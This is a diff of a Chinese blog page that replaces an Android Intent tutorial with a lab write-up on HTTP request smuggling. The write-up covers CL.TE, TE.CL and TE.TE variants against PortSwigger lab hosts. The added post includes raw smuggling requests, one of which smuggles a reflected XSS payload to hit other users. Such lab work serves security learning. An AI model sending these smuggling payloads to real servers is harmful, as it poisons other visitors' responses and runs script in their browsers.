@@ -63,21 +63,21 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
-    <article id="post-Activity及Intent" class="article global-container article-type-post" itemscope itemprop="blogPost">
+    <article id="post-http协议走私实验" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
       
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/11/Activity及Intent/">Activity及Intent</a>
+      <a class="article-title" href="/2020/03/02/http协议走私实验/">http协议走私实验</a>
     </h1>
   
 
     </header>
   
   <div class="article-meta">
-    <a href="/2020/02/11/Activity及Intent/" class="article-date">
-  <time datetime="2020-02-11T07:49:40.000Z" itemprop="datePublished">2020-02-11</time>
+    <a href="/2020/03/02/http协议走私实验/" class="article-date">
+  <time datetime="2020-03-02T14:25:16.000Z" itemprop="datePublished">2020-03-02</time>
 </a>
     
     
@@ -88,32 +88,17 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <p><strong>学习重点</strong>：使用Intent在Activity之间的跳转以及传值<br>        Activity的生命周期<br><strong>1 基本了解的知识点</strong><br>配置文件</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    package=&quot;ndk.runtest.helloapp&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;application</span><br><span class="line">        android:allowBackup=&quot;true&quot;</span><br><span class="line">        android:icon=&quot;@mipmap/ic_launcher&quot;</span><br><span class="line">        android:label=&quot;@string/app_name&quot;</span><br><span class="line">        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;</span><br><span class="line">        android:supportsRtl=&quot;true&quot;</span><br><span class="line">        android:theme=&quot;@style/AppTheme&quot;&gt;</span><br><span class="line">        &lt;activity android:name=&quot;.MainActivity&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line"></span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure></div>
+        <h3 id="实验前提："><a href="#实验前提：" class="headerlink" title="实验前提："></a>实验前提：</h3><p>   1代理服务器和后端服务器重用TCP连接<br>   2两个服务器实现RFC的标准不一样，代理服务器和后端服务认可的请求头不一样<br>   参考链接：<a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p>
+<h3 id="0x01-CL-TE"><a href="#0x01-CL-TE" class="headerlink" title="0x01 CL.TE"></a>0x01 CL.TE</h3><p>这里是走私的是x，末尾不加换行在实验中也可以达到走私的效果<br><img src="https://i.loli.net/2020/03/02/9cfUs6zqLxnRrAd.png" alt="45258497-16C1-45A3-AB42-CA26127EDE6B.png"><br>数据包</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac791f911ff1f48680494caa002e000d.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: session=JbGzWAoyZbXDrfwW0AZoCwScSQLBZ87V</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x</span><br></pre></td></tr></table></figure></div>
 
-<p>intent-filter表示此activity可以被其他应用程序访问到</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void onPause()&#123;</span><br><span class="line">    super.onPause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="0x02-TE-CL"><a href="#0x02-TE-CL" class="headerlink" title="0x02 TE.CL"></a>0x02 TE.CL</h3><p><img src="https://i.loli.net/2020/03/02/9cfUs6zqLxnRrAd.png" alt="45258497-16C1-45A3-AB42-CA26127EDE6B.png"><br>浏览器<br><img src="https://i.loli.net/2020/03/02/jZCxBVq1oS5zOLF.png" alt="2864F13B-3EA9-4CEF-9387-3DA613B42723.png"></p>
+<h3 id="0x03-TE-TE"><a href="#0x03-TE-TE" class="headerlink" title="0x03 TE.TE"></a>0x03 TE.TE</h3><p>重点 ：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。<br><img src="https://i.loli.net/2020/03/02/523dDICKRQbjUxL.png" alt="2A0C6ABF-E471-49D7-A5E8-0B6DF9F2B30E.png"></p>
+<h3 id="0x04-CL-TE将self-xss危害放大"><a href="#0x04-CL-TE将self-xss危害放大" class="headerlink" title="0x04 CL.TE将self-xss危害放大"></a>0x04 CL.TE将self-xss危害放大</h3><p>原理：走私可触发反射xss的请求头，等待受害者拼接走私的这个请求，并相应，导致无强交互的情况下执行xss代码<br>效果图：正常用户访问此网站</p>
+<p><img src="https://i.loli.net/2020/03/02/HNiUQpMPqRc2f9k.png" alt="CECA1062-45C7-4DBA-9F7A-7E898F00E3FA.png"></p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac7a1ffb1e5f8c5080e30b5f0061000d.web-security-academy.net</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Referer: https://ac7a1ffb1e5f8c5080e30b5f0061000d.web-security-academy.net/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: session=jd0lNFQCxLsyVysTaPA1YAEKO9STVbKr</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 123</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /post?postId=2 HTTP/1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure></div>
 
-<p>重写此方法实现，可以在Activity中断的时候进行数据保存<br><strong>2 activity跳转</strong><br>Intent机制用来协助应用程序之间的交互和通讯，描述的内容为动作，涉及数据 以及附加数据<br>具体应用为：<br>(1)通过Context.startActivity()或者Activity.startActivityForResult()启动一个Activity;<br>(2)通过Context.startService()启动一个服务，或者通过Context.bindService()和启动后台服务交互<br>(3)通过广播方法（如Context.sendBroadcast(),Context.sendOrderedBroadcast(),Context.sendSticckyBroadcast()）发送给broadcast receiver </p>
-<p>Intent的分类：<br>（1）隐士Intent，通过Intent Filter实现，一般用于在不同的应用程序之间<br>（2）显示Intent，通过指定Intent组件名称实现，一般用于在知道目标组件名称的前提下，一般用于相同应用程序之间。</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClass(A.this,B.class);</span><br><span class="line">startActivity(intent);</span><br><span class="line">…………</span><br><span class="line">Intent intent = new Intent(A.this,B.class);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure></div>
-
-<p>实现功能</p>
-<p><img src="https://i.loli.net/2020/02/10/ie4joV79tw1BEOZ.png" alt="image.png"><br>点击button后<br><img src="https://i.loli.net/2020/02/10/63crXWHvoha2yDf.png" alt="image.png"><br>主要配置以及代码，布局文件略：</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    package=&quot;ndk.runtest.helloapp&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;application</span><br><span class="line">        android:allowBackup=&quot;true&quot;</span><br><span class="line">        android:icon=&quot;@mipmap/ic_launcher&quot;</span><br><span class="line">        android:label=&quot;@string/app_name&quot;</span><br><span class="line">        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;</span><br><span class="line">        android:supportsRtl=&quot;true&quot;</span><br><span class="line">        android:theme=&quot;@style/AppTheme&quot;&gt;</span><br><span class="line">        &lt;activity android:name=&quot;.MainActivity&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;activity android:name=&quot;.SecondActivity&quot; android:label=&quot;SecondActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">    &lt;/application&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>代码 activity1</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.button);</span><br><span class="line">//        TextView text1=(TextView)findViewById(R.id.fist);</span><br><span class="line">//        text1.setText(&quot;admin&quot;);</span><br><span class="line">        Button button1 = (Button) findViewById(R.id.btnOK);</span><br><span class="line">        button1.setText(&quot;值改变了&quot;);</span><br><span class="line">        button1.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View v) &#123;</span><br><span class="line">                Intent intent=new Intent();</span><br><span class="line">                intent.setClass(MainActivity.this,SecondActivity.class);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>activity2</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class SecondActivity extends AppCompatActivity &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>3隐式Intent</strong><br>创建</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">    @Override</span><br><span class="line">    public void onCreate(Bundle savedInstanceState)&#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.exp);</span><br><span class="line">        Button btn_action=(Button)findViewById(R.id.Exp_action);</span><br><span class="line">        btn_action.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onClick(View v) &#123;</span><br><span class="line">                Intent intent =new Intent();</span><br><span class="line">                intent.setAction(&quot;com.tang.android.t3.activity.Call&quot;);</span><br><span class="line">                intent.addCategory(&quot;com.tang.android.t3.activity.category1&quot;);</span><br><span class="line">//                intent.addCategory(Intent.CATEGORY_INFO);</span><br><span class="line">//                intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">                intent.setDataAndType(Uri.parse(&quot;http://www.tang.com/&quot;),&quot;text/plain&quot;);</span><br><span class="line">                startActivity(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>配置</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;activity android:name=&quot;.Call&quot; android:label=&quot;@string/intent1&quot;&gt;</span><br><span class="line">          &lt;intent-filter&gt;</span><br><span class="line">              &lt;action android:name=&quot;com.tang.android.t3.activity.Call&quot; /&gt;</span><br><span class="line">              &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">              &lt;category android:name=&quot;com.tang.android.t3.activity.category1&quot;/&gt;</span><br><span class="line">              &lt;category android:name=&quot;android.intent.category.INFO&quot;/&gt;</span><br><span class="line">              &lt;category android:name=&quot;android.intent.category.APP_MESSAGING&quot;/&gt;</span><br><span class="line">              &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;</span><br><span class="line">              &lt;data android:host=&quot;www.tang.com&quot;  android:scheme=&quot;http&quot; android:mimeType=&quot;text/*&quot;/&gt;</span><br><span class="line">          &lt;/intent-filter&gt;</span><br><span class="line">      &lt;/activity&gt;</span><br><span class="line">      &lt;activity android:name=&quot;.Exp&quot; android:label=&quot;Exp&quot;&gt;</span><br><span class="line">          &lt;intent-filter&gt;</span><br><span class="line">              &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</span><br><span class="line">              &lt;category  android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</span><br><span class="line">          &lt;/intent-filter&gt;</span><br><span class="line">      &lt;/activity&gt;</span><br></pre></td></tr></table></figure></div>
-
+<p>如何发挖掘类漏洞：<br><a href="https://portswigger.net/web-security/request-smuggling/finding" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding</a></p>
 
       
     </div>
@@ -128,7 +113,7 @@
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
 
@@ -175,6 +160,10 @@
       <ul>
         
           <li>
+            <a href="/2020/03/04/菜鸡版java反序列化漏洞学习/">菜鸡版java反序列化漏洞学习</a>
+          </li>
+        
+          <li>
             <a href="/2020/03/02/http协议走私实验/">http协议走私实验</a>
           </li>
         
@@ -188,10 +177,6 @@
         
           <li>
             <a href="/2020/02/08/NDK-Build-方式实现JIN/">NDK-Build 方式实现JIN</a>
-          </li>
-        
-          <li>
-            <a href="/2020/01/29/hadoop-伪分布式/">hadoop 伪分布式</a>
           </li>
         
       </ul>
